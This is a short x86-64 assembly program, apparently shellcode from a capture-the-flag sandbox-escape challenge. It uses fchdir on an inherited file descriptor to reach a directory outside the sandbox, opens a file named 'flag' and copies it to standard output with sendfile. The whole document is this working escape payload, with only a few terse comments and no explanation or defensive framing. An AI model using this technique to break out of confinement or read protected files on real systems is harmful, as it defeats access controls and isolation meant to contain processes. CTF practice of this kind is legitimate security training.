global _start

%define SYS_fchdir 81
%define SYS_open 2
%define SYS_write 1
%define SYS_sendfile 40

_start:
    ; Now link using relative paths with file descriptors

    mov rax, SYS_fchdir
    mov rdi, 3 
    syscall

    ; Open the linked flag (that are outsed the sandbox)
    mov rax, SYS_open
    lea rdi, [rel flag]
    xor rsi, rsi
    mov rdx, 1
    syscall

    ; Send data to stdout file descriptor
    mov rsi, rax
    mov rax, SYS_sendfile
    mov rdi, 1
    mov rdx, 0
    mov r10, 100
    syscall

flag:
    db "flag", 0
